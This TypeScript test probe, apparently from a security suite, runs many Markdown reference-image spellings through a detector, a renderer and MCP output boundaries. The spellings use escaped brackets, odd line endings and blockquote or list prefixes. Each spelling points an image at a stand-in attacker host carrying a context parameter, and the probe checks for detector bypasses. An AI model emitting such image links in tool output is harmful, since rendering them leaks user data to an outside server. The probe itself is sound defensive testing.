// T84 — item 1: spellings NONE of T82's 18 (s01..s18) or T83's 20 (m01..m20)
// used, driven through the shipped detector, the renderer this floor defends
// against, and all four public boundaries.
//
// The question is only ever one thing: is there a document `marked` fetches an
// attacker host for while some boundary carries that host? Everything else is
// recorded but is not a bypass.
//
// Read-only, offline, synthetic and reserved hosts only.
// Usage: bun T84-escape.ts
import {
  prepareOutputForPersistence,
  validateOutputForTransport,
  type GuardResult,
} from "../../../../src/security/guard";
import { mergeMcpConfig } from "../../../../src/mcp/config";
import { buildDiscovery } from "../../../../src/mcp/discovery";
import { dispatchCallTool, type McpContext } from "../../../../src/mcp/dispatch";
import { redactToolOutput } from "../../../../src/mcp/redact-seam";
import { detectExfil } from "../../../../src/security/detect/exfil";
import { marked } from "marked";

const ATT = "attacker.invalid";
const U = `https://${ATT}/p?ctx=CTX`;
const OK = "https://ok.example.org/x";

const pass: GuardResult = {
  allowed: true,
  decision: { gate: "pass", action: "allow", findings: [] },
};

const shapes: Record<string, string> = {
  x00Baseline: `![a]\n\n[a]: ${U}\n`,

  // --- escape spellings no prior round wrote -------------------------------
  // an escaped OPEN and an escaped CLOSE in the same label (s06 had the open
  // alone; m01 had an UNESCAPED open, which CommonMark rejects)
  x01EscapedOpenAndClose: `![a\\[b\\]c]\n\n[a\\[b\\]c]: ${U}\n`,
  // tab-indented definition carrying an escaped close
  x02TabIndentedEscapedDef: `![foo\\]]\n\n\t[foo\\]]: ${U}\n`,
  // escaped close with a quoted title after the destination
  x03EscapedCloseWithTitle: `![foo\\]]\n\n[foo\\]]: ${U} "t"\n`,
  // the label itself spans two lines AND carries an escaped close
  x04MultilineEscapedLabel: `![a\\]b\nc]\n\n[a\\]b\nc]: ${U}\n`,
  // U+2028, which JS `^` under /m matches after and the scanner lists as a
  // line terminator
  x05LineSeparatorU2028: `![foo\\]]  [foo\\]]: ${U} `,
  // CRLF, where the scanner's line walk lands on the `\n` first
  x06CrLfEscapedDef: `![foo\\]]\r\n\r\n[foo\\]]: ${U}\r\n`,
  // collapsed use of an escaped label written with the explicit `[]`
  x07CollapsedEscaped: `![a\\]b][]\n\n[a\\]b]: ${U}\n`,
  // escaped backslash, then escaped close, then a real close — parity has to
  // survive three consecutive backslashes inside a longer label
  x08MixedBackslashRun: `![a\\\\\\]b\\]c]\n\n[a\\\\\\]b\\]c]: ${U}\n`,
  // full spelling whose ALT carries the escape and whose REF does not
  x09EscapeInAltOnly: `![a\\]][b]\n\n[b]: ${U}\n`,
  // case + whitespace + escape at once
  x10CaseAndWhitespaceEscape: `![FOO\\]  BAR]\n\n[foo\\] bar]: ${U}\n`,
  // definition destination two lines down, past a blank line
  x11EscapedDefBlankLineDestination: `![foo\\]]\n\n[foo\\]]:\n\n${U}\n`,
  // no trailing newline after the definition
  x12EscapedDefNoTrailingNewline: `![foo\\]]\n\n[foo\\]]: ${U}`,
  // a definition line whose label has escaped closes only, terminated by an
  // unescaped `]` that lives on a LATER line — reading 2 searches forward
  x13EscapedCloseTerminatorNextLine: `[a\\]b\\]: ${U}\nx]: ${OK}\n\n![a\\]\n`,
  // 4-space indent: a code block for CommonMark, so nothing is fetched
  x14FourSpaceIndentedDef: `![foo\\]]\n\n    [foo\\]]: ${U}\n`,
  // empty angle destination
  x15EmptyAngleDestination: `![foo\\]]\n\n[foo\\]]: <>\n[foo\\]]: ${U}\n`,

  // --- line-start prefixes the scanner's `^[ \t]*` cannot reach -------------
  // (pre-existing surface: the replaced pattern had the same anchor)
  x20BlockquoteDefPlain: `> [a]: ${U}\n>\n> ![a]\n`,
  x20bBlockquoteDefEscaped: `> [a\\]]: ${U}\n>\n> ![a\\]]\n`,
  x21ListItemDefPlain: `- [a]: ${U}\n\n![a]\n`,
  x21bListItemDefEscaped: `- [a\\]]: ${U}\n\n![a\\]]\n`,
  x22NestedBlockquoteDef: `> > [a]: ${U}\n> >\n> > ![a]\n`,

  // --- the `lastIndex`/resumeAt seam ---------------------------------------
  // a reading-1 definition whose destination `\s*` reaches the next line, where
  // an escaped definition sits
  x30ResumeSwallowsEscapedDef: `[a]:\n[b\\]]: ${U}\n\n![b\\]]\n`,
  x31ResumeSwallowsPlainDef: `[a]:\n[b]: ${U}\n\n![b]\n`,
};

const cwd = process.cwd();
const ctx: McpContext = {
  cwd,
  config: mergeMcpConfig({ redactToolOutput: false }),
  discovery: buildDiscovery({ modules: { mcp: { enabled: true } as never } }),
  transport: "in-process",
  tools: Object.entries(shapes).map(([name, text]) => ({
    name: `p.${name}`,
    module: "standard" as const,
    description: name,
    inputSchema: { type: "object" },
    mutating: false,
    invoke: async () => ({ note: text }),
  })),
};

function rendererImgSrcs(md: string): string[] {
  const html = marked.parse(md, { async: false }) as string;
  return [...html.matchAll(/<img[^>]*\ssrc="([^"]*)"/g)].map((m) => m[1] as string);
}

const rows: Array<Record<string, unknown>> = [];
for (const [name, text] of Object.entries(shapes)) {
  const serialized = JSON.stringify({ note: text });
  const call = await dispatchCallTool(ctx, `p.${name}`, {});
  const persisted = prepareOutputForPersistence(pass, serialized);
  const transported = validateOutputForTransport({ value: { note: text }, format: "json" });
  const seamText = await redactToolOutput(cwd, serialized);
  const imgs = rendererImgSrcs(text);
  const rendererFetchesAttacker = imgs.some((s) => s.includes(ATT));
  const boundaries = {
    mcp: JSON.stringify(call).includes(ATT),
    persist: persisted.allowed ? persisted.content.includes(ATT) : false,
    transport: transported.text.includes(ATT),
    seam: seamText.includes(ATT),
  };
  rows.push({
    id: name,
    rendererFetches: imgs,
    rendererFetchesAttacker,
    detectorFindings: detectExfil(text, []).length,
    mcpState: (call as { redaction?: { state?: string } }).redaction?.state ?? "?",
    boundaries,
    leaksAtAnyBoundary: Object.values(boundaries).some(Boolean),
    verdict:
      rendererFetchesAttacker && Object.values(boundaries).some(Boolean) ? "BYPASS" : "closed",
  });
}

console.log(
  JSON.stringify(
    {
      probe: "T84-escape",
      rows,
      bypasses: rows.filter((r) => r.verdict === "BYPASS").map((r) => r.id),
      rendererFetchesButNoFinding: rows
        .filter((r) => r.rendererFetchesAttacker && r.detectorFindings === 0)
        .map((r) => r.id),
      findingWithoutRendererFetch: rows
        .filter((r) => !r.rendererFetchesAttacker && (r.detectorFindings as number) > 0)
        .map((r) => r.id),
    },
    null,
    2,
  ),
);
